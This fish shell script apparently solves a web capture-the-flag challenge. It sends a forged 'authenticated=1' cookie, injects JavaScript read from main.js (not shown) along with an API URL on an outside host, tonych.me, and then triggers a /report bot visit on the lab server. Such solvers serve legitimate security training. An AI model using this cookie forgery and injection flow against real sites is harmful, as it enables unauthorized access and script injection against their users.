
set code (cat main.js)
function get_api_id
  if [ $host = 'http://localhost:10010' ]
    curl "$host/add-api" -s -b 'authenticated=1' --data-raw "url=http%3A%2F%2F192.168.33.11%3A3000%2Fapi&javascript=$code" | awk '{print $8}'
  else
    curl "$host/add-api" -s -b 'authenticated=1' --data-raw "url=http%3A%2F%2Ftonych.me%3A10000%2Fapi&javascript=$code" | awk '{print $8}'
  end
end

function submit
  echo "host: $host"
  set api_id (get_api_id)
  echo "api_id: $api_id"
  curl "$host/report" -s -H 'Cookie: authenticated=1' --data-raw "id=$api_id&alias=abc123" 
end


function local
  set host 'http://localhost:10010'
  submit
end

function remote
  set host 'http://edu-ctf.zoolab.org:10010' 
  submit
end
local 
remote